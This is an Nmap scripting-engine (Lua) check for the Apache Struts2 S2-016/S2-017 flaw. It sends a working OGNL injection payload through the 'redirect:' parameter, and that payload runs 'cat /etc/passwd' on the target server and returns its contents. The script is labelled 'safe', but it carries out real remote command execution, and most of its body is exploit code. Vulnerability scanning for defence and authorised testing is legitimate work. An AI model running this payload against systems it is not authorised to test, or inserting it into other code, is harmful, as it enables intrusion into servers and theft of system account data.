local http=require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local nmap = require "nmap"

description = [[ Apache Struts2 ]]

author = "m0zh3"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = shortport.portnumber({80,443,8080})

local path = stdnse.get_script_args('http-get.path')
local status

local function exploit(host,port)
	local payload = "GET " .. stdnse.get_script_args('http-get.path') .. "?redirect%3a%24{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWrite().flush(),%23matt.getWriter().close()} HTTP/1.1\r\nHost:" .. host.targetname .. "\r\n\r\n"
	local try = nmap.new_try()
        local socket = nmap.new_socket()
        socket:set_timeout(500 * 1000)
        socket:connect(host.ip, port)
        socket:send(payload)
        local response = try(socket:receive())
	stdnse.print_debug(response)
	socket:close()
        for s in string.gmatch(response,"%w+:%w+:%w+:%w+:%w+:") do
		if 'root' ~= s then
			status = "yes"
			break
		end
	end
end
action = function(host,port)
        local struts2  = {
                title = "Apache Struts2 S2-016/S2-017",
                references = {
                  'http://www.m00zh33.com',
                },
                exploit_results = {},
        }

        local report = vulns.Report:new(SCRIPT_NAME, host, port)
        struts2.state = vulns.STATE.NOT_VULN
	exploit(host,port)
	stdnse.print_debug(status)
	if status == "yes" then
                struts2.state = vulns.STATE.VULN
        end
        return report:make_output(struts2)
end
